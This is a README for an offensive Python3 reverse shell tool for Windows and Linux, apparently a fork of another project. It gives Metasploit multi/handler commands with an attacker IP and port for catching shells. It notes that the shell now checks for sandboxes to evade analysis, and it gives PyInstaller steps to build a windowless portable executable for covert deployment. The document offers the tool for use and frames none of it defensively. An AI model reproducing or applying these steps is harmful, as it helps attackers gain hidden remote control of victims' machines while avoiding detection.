
# Python Reverse Shell for Windows / Linux
Reverse Shell written in Python3 - Modified version of trackmastersteve/shell

You can take advantage of post exploitation modules in Metasploit by using:

    msf> use exploit/multi/handler 
    msf> set PAYLOAD [linux/shell_reverse_tcp | windows/shell_reverse_tcp]
    msf> set LHOST <Attacker IP>      
    msf> set LPORT <Attacker Port>    
    msf> set ExitOnSession false
    msf> run -j

Modified for a less fragile shell and a check for sandbox

To use on Windows, create an executable using pyinstaller

    python -m pip install pyinstaller
    pyinstaller -wF ./reverse_shell.py

Useful PyInstaller Options:
> -w removes pop up windows
> -F outputs a portable .exe file in the ./dist/ folder
